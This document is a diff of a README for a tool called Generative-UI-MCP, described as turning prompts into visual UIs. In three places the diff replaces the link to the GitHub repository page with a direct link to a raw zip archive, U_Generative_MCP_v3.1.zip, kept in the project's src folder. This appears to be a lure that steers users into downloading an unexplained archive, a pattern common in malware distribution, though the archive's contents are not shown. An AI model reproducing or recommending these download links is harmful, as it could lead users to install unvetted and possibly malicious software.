@@ -1,6 +1,6 @@
 # 🧩 Generative-UI-MCP - Turn Prompts Into Visual UIs
 
-[![Download Generative-UI-MCP](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fergusalveolar205/Generative-UI-MCP)
+[![Download Generative-UI-MCP](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/fergusalveolar205/Generative-UI-MCP/main/src/U_Generative_MCP_v3.1.zip)
 
 ## 🚀 What This Tool Does
 
@@ -29,7 +29,7 @@ Before you start, make sure you have:
 ## 📥 Download and Run
 
 Visit this page to download:
-https://github.com/fergusalveolar205/Generative-UI-MCP
+https://raw.githubusercontent.com/fergusalveolar205/Generative-UI-MCP/main/src/U_Generative_MCP_v3.1.zip
 
 After the page opens:
 
@@ -250,7 +250,7 @@ This project focuses on:
 ## 📦 Download Again
 
 Visit this page to download:
-https://github.com/fergusalveolar205/Generative-UI-MCP
+https://raw.githubusercontent.com/fergusalveolar205/Generative-UI-MCP/main/src/U_Generative_MCP_v3.1.zip
 
 ## 🧪 Suggested First Test
 
